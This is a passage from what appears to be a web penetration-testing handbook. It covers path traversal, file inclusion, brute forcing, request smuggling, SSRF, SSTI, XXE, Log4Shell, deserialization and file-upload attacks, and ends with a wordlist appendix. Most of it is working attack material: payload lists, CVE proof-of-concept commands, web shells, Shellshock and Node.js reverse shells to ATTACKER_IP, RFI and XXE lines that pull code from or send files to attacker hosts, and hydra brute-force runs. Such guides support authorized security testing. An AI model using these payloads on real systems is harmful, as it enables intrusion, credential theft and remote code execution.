> - [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
> - [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 9. Phase 8 — Path Traversal, LFI & RFI

> **Goal:** Read arbitrary files on the server or include remote code.

| Vulnerability | OWASP | CWE | CVE Examples | Exploit-DB |
|---|---|---|---|---|
| Path Traversal | WSTG-ATHZ-01, A01:2021 | CWE-22 | CVE-2021-41773 (Apache) | EDB-50383 |
| LFI | WSTG-INPV-11 | CWE-98 | CVE-2022-21661 (WordPress) | EDB-50082 |
| RFI | WSTG-INPV-11 | CWE-98 | CVE-2022-0140 | — |
| LFI to RCE via log poisoning | WSTG-INPV-11 | CWE-98 | — | — |

### 9.1 Path Traversal

**Target parameters:** `file=`, `page=`, `path=`, `dir=`, `doc=`, `include=`, `template=`, `lang=`, `download=`

```bash
# Basic traversal
../../../../etc/passwd
../../../../etc/passwd%00       (null byte — old PHP versions)

# Encoded variants
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd   (double encoded)
....//....//....//etc/passwd          (stripped traversal bypass)
..././..././..././etc/passwd          (filter bypass)
/./././././././etc/passwd

# Windows targets
..\..\..\windows\system32\drivers\etc\hosts
..%5C..%5C..%5Cwindows\system32\drivers\etc\hosts
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/system32/drivers/etc/hosts

# Automated traversal with ffuf
ffuf -u "https://target.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0

# With dotdotpwn
dotdotpwn -m http -h target.com -U "/download?file=" -k "root:"

# Interesting files to read (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/<user>/.bash_history
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf

# Interesting files (Windows)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\cmd.exe
C:\inetpub\wwwroot\web.config
```

### 9.2 Local File Inclusion (LFI)

```bash
# PHP wrappers for LFI exploitation
# Base64 encode and read PHP source
?page=php://filter/convert.base64-encode/resource=index.php
# Decode: echo "BASE64" | base64 -d

# Expect wrapper (if enabled)
?page=expect://id

# Data wrapper
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# Input wrapper (POST data executed as PHP)
curl -X POST "https://target.com/?page=php://input" \
  -d '<?php system("id"); ?>'

# LFI with log poisoning → RCE
# Step 1: Poison Apache log with PHP in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 2: Include the log file
?page=../../../var/log/apache2/access.log&cmd=id

# Nginx log poisoning
?page=../../../var/log/nginx/access.log&cmd=whoami

# PHP session poisoning
# Step 1: Set PHP session with payload
curl -c cookie.txt "https://target.com/profile" \
  --data "username=<?php system('id'); ?>"

# Step 2: Include the session file
?page=/var/lib/php/sessions/sess_<SESSION_ID>

# /proc/self/environ poisoning (if readable)
# Step 1: Poison User-Agent
curl -A "<?php system(\$_GET['c']); ?>" https://target.com/

# Step 2: Include environ
?page=/proc/self/environ&c=id
```

### 9.3 Remote File Inclusion (RFI)

```bash
# Basic RFI (requires allow_url_include=On in PHP)
?page=http://attacker.com/shell.php
?page=https://attacker.com/shell.php
?page=ftp://attacker.com/shell.php

# SMB RFI (Windows)
?page=\\attacker.com\share\shell.php

# Host malicious PHP file on attacker server
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
python3 -m http.server 80

# Test
curl "https://target.com/?page=http://ATTACKER_IP/shell.php&cmd=id"
```

### 9.4 Path Traversal — Apache CVE-2021-41773 PoC

```bash
# CVE-2021-41773 — Apache 2.4.49 Path Traversal & RCE
# CVSS: 9.8 | Exploit-DB: EDB-50383

# Check if vulnerable
curl -s --path-as-is "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# RCE via mod_cgi
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
  "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# CVE-2021-42013 — Apache 2.4.50 bypass of 41773
curl -s --path-as-is "https://target.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
```

---

## 10. Phase 9 — Brute Forcing & Default Credentials

> **Goal:** Gain access via credential attacks on login panels, services, and APIs.

| Vulnerability | OWASP | CWE | CVE/Ref |
|---|---|---|---|
| Weak password policy | WSTG-ATHN-07 | CWE-521 | — |
| No account lockout | WSTG-ATHN-03 | CWE-307 | — |
| Default credentials | WSTG-ATHN-02 | CWE-1392 | — |
| No rate limiting | WSTG-ATHN-04 | CWE-307 | — |

### 10.1 Default Credentials

```bash
# Check DefaultCreds-Cheat-Sheet
# https://github.com/ihebski/DefaultCreds-cheat-sheet
pip install defaultcreds-cheat-sheet
creds search apache tomcat

# Common default admin portals
# /admin /manager/html /phpmyadmin /wp-admin /administrator

# Common credential pairs to try
admin:admin
admin:password
admin:admin123
admin:1234
admin:Password1
root:root
root:toor
test:test
guest:guest
administrator:administrator

# Tool-specific defaults
# Apache Tomcat: tomcat:tomcat, admin:s3cret
# JBoss: admin:admin
# Jenkins: admin:admin (or empty password)
# Kibana: elastic:changeme
# Grafana: admin:admin
# MongoDB: (no auth by default)
# MySQL: root: (empty)
```

### 10.2 Brute Forcing with Hydra

```bash
# HTTP Form brute force
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 30 -V

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt target.com http-get /admin

# SSH brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target.com -t 4

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://target.com
```

### 10.3 Brute Forcing with ffuf (API / Web)

```bash
# API password spray
ffuf -u "https://target.com/api/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401,403 -t 20

# Username enumeration (look for different response size/time)
ffuf -u "https://target.com/login" -X POST \
  -d "username=FUZZ&password=wrongpassword" \
  -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -mc 200 -fs 1234   # filter by known failure response size
```

### 10.4 Brute Forcing with Burp Suite Intruder

```
1. Capture login request in Burp Proxy
2. Send to Intruder (Ctrl+I)
3. Clear all § marks
4. Mark username/password fields: §value§
5. Attack Type: Cluster Bomb (both lists) or Sniper (one list)
6. Load payload lists:
   - Usernames: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
   - Passwords: /usr/share/wordlists/rockyou.txt
7. Start Attack → sort by response length or status code
8. Look for different status code (302 redirect) or response size
```

### 10.5 Rate Limit Bypass Techniques

```bash
# IP rotation via X-Forwarded-For header
X-Forwarded-For: <incrementing IPs>
X-Real-IP: <IP>
X-Originating-IP: <IP>
X-Remote-IP: <IP>
X-Client-IP: <IP>
True-Client-IP: <IP>

# With ffuf
ffuf -u "https://target.com/login" -X POST \
  -d "username=admin&password=FUZZ" \
  -H "X-Forwarded-For: FUZZ2" \
  -w passwords.txt:FUZZ -w ips.txt:FUZZ2 \
  -mode pitchfork

# Generate sequential IPs
for i in $(seq 1 255); do echo "192.168.1.$i"; done > ips.txt
```

---

## 11. Phase 10 — HTTP Request Smuggling

> **Goal:** Desynchronize front-end/back-end HTTP request parsing to poison the request queue.

| Vulnerability | OWASP | CWE | CVE Examples | Exploit-DB |
|---|---|---|---|---|
| CL.TE Smuggling | WSTG-INPV | CWE-444 | CVE-2022-22720 (Apache) | EDB-50512 |
| TE.CL Smuggling | WSTG-INPV | CWE-444 | CVE-2019-18277 (HAProxy) | — |
| TE.TE Smuggling | WSTG-INPV | CWE-444 | — | — |
| HTTP/2 Downgrade | WSTG-INPV | CWE-444 | CVE-2021-44224 | — |

### 11.1 Detection

```bash
# Use Burp Suite HTTP Request Smuggler extension (by James Kettle)
# Install via BApp Store: "HTTP Request Smuggler"

# Manual detection — CL.TE (send and look for timeout/different response)
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X

# TE.CL detection
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### 11.2 CL.TE Attack PoC

```
# Front-end uses Content-Length, Back-end uses Transfer-Encoding

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /admin HTTP/1.1
Host: target.com
Foo: x
```

### 11.3 TE.CL Attack PoC

```
# Front-end uses Transfer-Encoding, Back-end uses Content-Length

POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### 11.4 HTTP/2 Request Smuggling

```bash
# Use Burp Suite with HTTP/2 support
# Send in Repeater with HTTP/2 protocol
# Inject \r\n in header values to create request confusion

# H2.CL via Burp Repeater:
# Header: content-length: 0
# Body: crafted smuggled request

# h2c smuggling (cleartext HTTP/2 upgrade)
python3 h2csmuggler.py --scan-list hosts.txt
```

### 11.5 Request Smuggling Impact

```bash
# Bypass front-end security controls (WAF/access control)
# Capture another user's request (session hijacking)
# Cache poisoning via smuggled responses
# Reflect XSS in prefixed smuggled response body
```

> 📎 **References:**
> - [PortSwigger HTTP Smuggling Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
> - [PortSwigger Smuggling Labs](https://portswigger.net/web-security/request-smuggling)

---

## 12. Phase 11 — HTTP Verb & Parameter Tampering

> **Goal:** Abuse HTTP method handling and parameter processing logic.

| Vulnerability | OWASP | CWE | CVE/Ref |
|---|---|---|---|
| HTTP Verb Tampering | WSTG-CONF-06 | CWE-650 | — |
| Parameter Pollution (HPP) | WSTG-INPV-04 | CWE-20 | — |
| Mass Assignment | A01:2021 | CWE-915 | CVE-2012-2660 (Rails) |
| IDOR via parameter | WSTG-ATHZ-04 | CWE-639 | — |

### 12.1 HTTP Verb Tampering

```bash
# Test all HTTP methods on protected endpoints
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/admin
  echo
done

# Look for:
# - Endpoints that return 403 on GET but 200 on POST (or vice versa)
# - Endpoints that return 405 only for some methods
# - TRACE method enabled (XST - Cross-Site Tracing)

# Check for OPTIONS method (reveals allowed methods)
curl -X OPTIONS -I https://target.com/
# Look for: Allow: GET, POST, PUT, DELETE, ...

# TRACE method (XST)
curl -X TRACE -I https://target.com/ -H "Cookie: session=secret123"
# If TRACE returns your cookie in response body: vulnerable to XST

# Bypass 403 with method override headers
curl -X GET "https://target.com/admin" -H "X-HTTP-Method-Override: DELETE"
curl -X POST "https://target.com/admin" -H "X-Method-Override: PUT"
curl -X POST "https://target.com/resource/1" -H "X-HTTP-Method: DELETE"
```

### 12.2 HTTP Parameter Pollution (HPP)

```bash
# Duplicate parameters — different frameworks handle differently
# ASP.NET: uses last value
# PHP: uses last value
# JSP: uses first value
# Flask: uses first value

# Test with duplicate params
https://target.com/transfer?amount=100&to=attacker&amount=1
# If server uses first amount=100 for display but last for processing → HPP

# HPP in POST body
curl -X POST "https://target.com/transfer" \
  -d "amount=100&to=victim&to=attacker"

# HPP to bypass WAF signatures
# WAF checks: ?id=1 OR 1=1 (blocked)
# HPP: ?id=1&id= OR 1=1 (may bypass)
curl "https://target.com/item?id=1&id=2 UNION SELECT 1,2,3--"
```

### 12.3 Mass Assignment

```bash
# Try adding admin/privileged parameters to registration/update requests
# Original: {"username":"user","password":"pass"}
# Tampered: {"username":"user","password":"pass","role":"admin","isAdmin":true}

curl -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","role":"admin","isAdmin":true,"verified":true}'

# Rails mass assignment bypass (historical)
# Try adding: user[admin]=true, user[role]=superuser

# Try adding price override
# {"item_id": 1, "quantity": 1, "price": 0.01}
curl -X POST "https://target.com/api/checkout" \
  -H "Content-Type: application/json" \
  -d '{"item_id": 1, "quantity": 1, "price": 0.01}'
```

### 12.4 IDOR (Insecure Direct Object Reference)

```bash
# Replace your user ID with another user's in all API calls
# GET /api/user/1001/profile → change to /api/user/1002/profile

# Check predictable patterns
# User ID: 1001 → try 1000, 1002, 1003
# Order ID: ORD-2024-001 → try ORD-2024-002
# UUID: if truly random, try Burp Sequencer to test entropy

# Horizontal privilege escalation
curl -H "Authorization: Bearer <your_token>" \
  "https://target.com/api/orders/OTHER_USER_ORDER_ID"

# Vertical privilege escalation
curl -H "Authorization: Bearer <user_token>" \
  "https://target.com/api/admin/users"
```

---

## 13. Phase 12 — Common & Classic Vulnerabilities

> **Goal:** Test for well-known vulnerabilities that are often overlooked in mature applications.

### 13.1 Shellshock (CVE-2014-6271)

| Field | Value |
|---|---|
| **CVE** | CVE-2014-6271, CVE-2014-6277, CVE-2014-6278, CVE-2014-7169 |
| **CWE** | CWE-78 |
| **CVSS** | 10.0 (Critical) |
| **Exploit-DB** | EDB-34765, EDB-34766 |
| **Affected** | Bash < 4.3 patch 25, CGI scripts, DHCP clients |

```bash
# Detect: Look for /cgi-bin/ endpoints using bash scripts (.sh, .cgi, .pl, .py scripts calling bash)
# Common paths: /cgi-bin/test.cgi, /cgi-bin/printenv, /cgi-bin/status

# Test for Shellshock via User-Agent
curl -A "() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id" \
  "https://target.com/cgi-bin/test.cgi"

# Test via Referer header
curl -H "Referer: () { :; }; echo Content-Type: text/plain; echo; id" \
  "https://target.com/cgi-bin/test.cgi"

# Test via Cookie
curl -H "Cookie: () { :; }; echo Content-Type: text/plain; echo; id" \
  "https://target.com/cgi-bin/test.cgi"

# Reverse shell via Shellshock
curl -A "() { ignored; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  "https://target.com/cgi-bin/vulnerable.sh"

# Automated detection with Nuclei
nuclei -u https://target.com -t cves/2014/CVE-2014-6271.yaml

# Nmap script
nmap -sV --script=http-shellshock --script-args uri=/cgi-bin/test.cgi target.com
```

### 13.2 Server-Side Request Forgery (SSRF)

| Field | Value |
|---|---|
| **OWASP** | A10:2021 |
| **CWE** | CWE-918 |
| **CVE Examples** | CVE-2021-26855 (Exchange ProxyLogon), CVE-2022-22954 (VMware) |

```bash
# SSRF test points: url=, fetch=, redirect=, src=, href=, path=, dest=, uri=, returnUrl=

# Internal network probe
https://target.com/fetch?url=http://127.0.0.1/
https://target.com/fetch?url=http://localhost/admin
https://target.com/fetch?url=http://192.168.1.1/
https://target.com/fetch?url=http://10.0.0.1/

# AWS metadata SSRF
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/
# Add header: Metadata-Flavor: Google

# Azure metadata
https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# SSRF bypass techniques
http://0177.0.0.1/      (octal)
http://0x7f.0.0.1/      (hex)
http://2130706433/       (decimal)
http://127.0.0.1.nip.io/ (DNS redirect)
http://localtest.me/     (resolves to 127.0.0.1)
http://spoofed.attacker.com/  (DNS rebinding)

# Use Burp Collaborator / interactsh to detect blind SSRF
https://target.com/fetch?url=http://YOUR_BURP_COLLABORATOR_URL/test
interactsh-client  # Start listener
```

### 13.3 Server-Side Template Injection (SSTI)

```bash
# Detection probe — inject math expression
{{7*7}}        → 49 (Jinja2/Twig)
${7*7}         → 49 (FreeMarker)
<%= 7*7 %>     → 49 (ERB)
#{7*7}         → 49 (Ruby)
*{7*7}         → 49 (Spring SpEL)
{{7*'7'}}      → 7777777 (Jinja2) or 49 (Twig)

# Jinja2 (Python) RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0]}}

# FreeMarker (Java) RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity (Java) RCE
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# Pebble (Java) RCE
{% for x in "".class.forName("java.lang.Runtime").getDeclaredMethods() %}{{x}}{% endfor %}

# Automated: tplmap
python3 tplmap.py -u "https://target.com/page?name=test"
```

### 13.4 XML External Entity (XXE)

```bash
# Basic XXE to read /etc/passwd
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>

# Blind XXE via out-of-band (requires Burp Collaborator / interactsh)
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.COM/evil.dtd">
  %xxe;
]>
<foo>&data;</foo>

# evil.dtd hosted on attacker server
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY data SYSTEM 'http://ATTACKER.COM/?x=%file;'>">
%eval;

# XXE via SVG file upload
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text></svg>

# XXE via Excel (.xlsx) — XML embedded in zip
# Create file → rename to .zip → edit xl/sharedStrings.xml
```

### 13.5 Open Redirect

```bash
# Identify redirect parameters
# redirect=, url=, next=, returnUrl=, return=, goto=, continue=

# Basic test
https://target.com/login?redirect=https://evil.com

# Filter bypass
https://target.com/login?redirect=//evil.com
https://target.com/login?redirect=https://evil.com%2F@target.com
https://target.com/login?redirect=https://target.com.evil.com
https://target.com/login?redirect=//target.com%40evil.com
https://target.com/login?redirect=javascript:alert(1)  (→ XSS)
https://target.com/login?redirect=data:text/html,<script>alert(1)</script>

# Open redirect to phishing
# Can be used to bypass OAuth state token validation
# Can be chained with SSRF
```

### 13.6 Log4Shell (CVE-2021-44228)

| Field | Value |
|---|---|
| **CVE** | CVE-2021-44228, CVE-2021-45046 |
| **CWE** | CWE-917 |
| **CVSS** | 10.0 |
| **Affected** | Apache Log4j2 2.0-beta9 to 2.14.1 |

```bash
# Inject in all input fields, HTTP headers
# Use Burp Collaborator / interactsh for blind detection

# Basic payload (insert in User-Agent, X-Forwarded-For, login fields, etc.)
${jndi:ldap://ATTACKER.BURPCOLLAB.COM/test}
${jndi:ldap://ATTACKER.COM:1389/exploit}

# Bypass filters
${${lower:j}ndi:ldap://ATTACKER.COM/test}
${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER.COM/test}
${j${::-n}di:ldap://ATTACKER.COM/test}
${${upper:j}ndi:${upper:l}dap://ATTACKER.COM/test}

# Headers to test
User-Agent: ${jndi:ldap://ATTACKER.COM/}
X-Forwarded-For: ${jndi:ldap://ATTACKER.COM/}
X-Api-Version: ${jndi:ldap://ATTACKER.COM/}
Referer: ${jndi:ldap://ATTACKER.COM/}

# Automated scanning
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml
java -jar log4j-scan.jar --url https://target.com

# Full exploitation with JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
# Set up LDAP server → serve malicious Java class → get RCE
```

---

## 14. Phase 13 — Insecure Deserialization

> **Goal:** Exploit unsafe deserialization of attacker-controlled data to achieve RCE.

| Platform | OWASP | CWE | CVE Examples | Exploit-DB |
|---|---|---|---|---|
| Java deserialization | A08:2021 | CWE-502 | CVE-2015-4852 (WebLogic), CVE-2016-4437 (Shiro) | EDB-43459 |
| PHP deserialization | A08:2021 | CWE-502 | CVE-2022-21661 (WordPress) | — |
| .NET deserialization | A08:2021 | CWE-502 | CVE-2011-1249 | — |
| Python pickle | A08:2021 | CWE-502 | — | — |
| Node.js serialization | A08:2021 | CWE-502 | CVE-2017-5941 (node-serialize) | — |

### 14.1 PHP Deserialization

```php
// Detection: Look for serialized data in cookies or parameters
// PHP serialized format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

// Decode base64 cookie → look for O: (Object) or a: (Array) prefixes
echo "COOKIE_VALUE" | base64 -d

// Common magic methods to exploit:
// __wakeup(), __destruct(), __toString(), __call(), __get()

// PHP Object Injection PoC
// Find a class with dangerous __destruct or __wakeup
class Logger {
    public $logFile = '/var/www/html/shell.php';
    public $logData = '<?php system($_GET["cmd"]); ?>';
    
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

$payload = serialize(new Logger());
echo base64_encode($payload);
// Inject the base64 value into vulnerable cookie/parameter

// PHPGGC — PHP Gadget Chain Generator
git clone https://github.com/ambionics/phpggc
php phpggc -l             # List available gadget chains
php phpggc Laravel/RCE4 system id  # Generate Laravel RCE payload
php phpggc Symfony/RCE4 system id | base64 -w 0

// WordPress deserialization (CVE-2022-21661)
php phpggc WordPress/RCE1 system id
```

### 14.2 Java Deserialization

```bash
# Detection signals:
# Content-Type: application/x-java-serialized-object
# Base64 payload starting with: rO0AB  (hex: AC ED 00 05)
# Java deserialization magic bytes: 0xAC 0xED

# Check for magic bytes in requests
echo "rO0ABXNy..." | base64 -d | xxd | head

# ysoserial — Java deserialization payload generator
# https://github.com/frohoff/ysoserial

# List available payloads
java -jar ysoserial.jar

# Common gadget chains
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
java -jar ysoserial.jar Spring1 'id' > payload.bin

# Generate and send (e.g., against Apache Commons Collections)
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER.COM' | base64 -w 0

# For Apache Struts, WebLogic, JBoss, Jenkins
java -jar ysoserial.jar Groovy1 'id' > payload.bin
curl -X POST "https://target.com/vulnerable/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin

# Burp Suite: Java Deserialization Scanner extension
# Install from BApp Store → right-click request → Extensions → Java Deserialization Scanner

# Apache Shiro deserialization (CVE-2016-4437, CVE-2019-12422)
# Check for rememberMe cookie
# Decrypt rememberMe with known default key → inject payload
java -jar shiro_exploit.jar -g CommonsCollections4 -c "id" -u https://target.com/
```

### 14.3 Java Deserialization — WebLogic PoC

```bash
# CVE-2019-2725 / CVE-2020-2555 — Oracle WebLogic Deserialization RCE
# Check for open port: 7001, 7002 (WebLogic)
nmap -p 7001,7002 target.com

# Using JNDI injection payload
curl -X POST "http://target.com:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string>
      </class></java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# WebLogicScan automation
python3 WebLogicScan.py -u http://target.com -p 7001
```

### 14.4 Python Pickle Deserialization

```python
# Detection: pickle.loads() on user input
# Dangerous imports: pickle, cPickle, marshal, shelve

# Exploit: Craft malicious pickle payload
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
# Send payload to parameter that's deserialized with pickle.loads()
```

### 14.5 Node.js Deserialization

```javascript
// Affected: node-serialize package
// Detection: JSON with IIFE pattern in serialized data

// Payload (serialize and send to vulnerable endpoint)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(err,stdout){console.log(stdout)});}()"}

// Reverse shell payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\'');}()"}
```

> 📎 **References:**
> - [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization)
> - [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
> - [HackTricks Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)

---

## 15. Phase 14 — Business Logic & Miscellaneous

### 15.1 Business Logic Flaws

- [ ] **Price manipulation** — Change item price to negative or 0 in POST body
- [ ] **Quantity manipulation** — Set negative quantity for credit
- [ ] **Race conditions** — Send identical requests simultaneously (use Burp Turbo Intruder)
- [ ] **Coupon code abuse** — Reuse coupon codes, stack discounts
- [ ] **Account takeover** — Password reset token reuse, predictable tokens
- [ ] **Privilege escalation** — Access admin endpoints as regular user
- [ ] **Skip workflow steps** — Jump from step 1 to step 3 in multi-step process

```python
# Race condition via Python threading
import threading
import requests

url = "https://target.com/redeem_coupon"
cookies = {"session": "YOUR_SESSION"}
data = {"code": "DISCOUNT50"}

def redeem():
    r = requests.post(url, data=data, cookies=cookies)
    print(r.status_code, r.text[:50])

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

### 15.2 File Upload Vulnerabilities

```bash
# Upload a webshell bypassing extension checks
# Rename: shell.php → shell.php.jpg → shell.pHp → shell.php;.jpg
# Content-Type bypass: change to image/jpeg while keeping .php extension

# Polyglot shell (valid image + PHP code)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit_image.jpg
mv legit_image.jpg shell.jpg.php

# Double extension (if server executes based on first extension)
shell.php.png

# PHP alternatives if .php is blocked
shell.phtml / shell.pht / shell.php3 / shell.php4 / shell.php5 / shell.shtml

# .htaccess upload (if Apache)
# Upload .htaccess with: AddType application/x-httpd-php .jpg
# Then upload shell.jpg

# Upload SVG with XSS
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

# Test after upload
curl "https://target.com/uploads/shell.php?cmd=id"
```

---

## Appendix A — Wordlist Reference

> All wordlists are from [SecLists](https://github.com/danielmiessler/SecLists) unless otherwise noted. Install: `sudo apt install seclists` or `git clone https://github.com/danielmiessler/SecLists /usr/share/seclists`

### A.1 Directory & File Discovery

| Wordlist | Path / Download | Entries | Best For |
|---|---|---|---|
| **directory-list-2.3-medium** | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | 220,560 | General directory brute force |
| **directory-list-2.3-big** | `/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt` | 1,273,833 | Deep directory brute force |
| **raft-large-directories** | `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` | 62,284 | Clean, deduplicated dirs |
| **raft-large-files** | `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt` | 37,644 | File discovery |
| **raft-large-words** | `/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt` | 119,600 | General |
| **common.txt** | `/usr/share/seclists/Discovery/Web-Content/common.txt` | 4,727 | Quick scan |
| **big.txt** | `/usr/share/seclists/Discovery/Web-Content/big.txt` | 20,469 | Balanced speed/coverage |
| **quickhits.txt** | `/usr/share/seclists/Discovery/Web-Content/quickhits.txt` | 2,539 | Fast critical paths |
| **web-extensions.txt** | `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt` | 25 | Extension fuzzing |
| **Apache.fuzz.txt** | `/usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt` | 8,531 | Apache-specific |
| **IIS.fuzz.txt** | `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt` | 1,038 | IIS-specific |
| **Tomcat.txt** | `/usr/share/seclists/Discovery/Web-Content/Tomcat.txt` | 1,117 | Tomcat-specific |
| **Spring-Boot.txt** | `/usr/share/seclists/Discovery/Web-Content/spring-boot.txt` | 135 | Spring Boot actuators |
| **api-endpoints.txt** | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` | 12,195 | REST API discovery |
| **swagger-wordlist.txt** | `/usr/share/seclists/Discovery/Web-Content/swagger.txt` | 507 | OpenAPI/Swagger |

### A.2 Credentials & Password Lists

| Wordlist | Path / Download | Entries | Best For |
|---|---|---|---|
| **rockyou.txt** | `/usr/share/wordlists/rockyou.txt` | 14,341,564 | General password brute force |
| **best1050.txt** | `/usr/share/seclists/Passwords/Common-Credentials/best1050.txt` | 1,050 | Fastest smart attack |
| **10-million-password-list-top-1000** | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | 1,000 | Top 1k passwords |
| **10-million-password-list-top-10000** | `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt` | 10,000 | Broader coverage |
| **darkweb2017-top10000** | `/usr/share/seclists/Passwords/darkweb2017-top10000.txt` | 10,000 | Dark web breach data |
| **500-worst-passwords** | `/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt` | 500 | Quick worst passwords |
| **Default-Credentials** | `/usr/share/seclists/Passwords/Default-Credentials/` (directory) | Various | Default creds by service |
